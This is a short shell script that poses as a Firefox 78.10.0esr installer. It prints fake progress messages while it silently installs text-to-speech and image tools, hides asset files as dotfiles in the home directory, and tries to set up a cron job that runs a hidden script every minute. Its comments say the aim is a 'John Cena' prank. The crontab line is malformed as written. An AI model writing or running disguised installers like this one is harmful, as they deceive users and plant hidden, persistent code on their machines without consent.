echo "Thanks for installing Firefox 78.10.0esr"
echo "Estimated time until download: 30s"
# for text to speech stuff
sudo apt install festival &> /dev/null
echo "Updating sources"
echo "Gathering dependencies"
# for displaying cena pictures
sudo apt install imagemagick &> /dev/null
echo "Restoring user configuration"

# hide annoying stuff
mv ./assets/cena.jpg ~/.cena.jpg
mv ./assets/script.txt ~/.script.txt
mv ./assets/harmony.txt ~/.harmony.txt
mv ./assets/orchestra.sh ~/.orchestra.sh


echo "Configuring new packages"

# set the annoying stuff up 
crontab -e * * * * bin/bash ~/.orchestra.sh

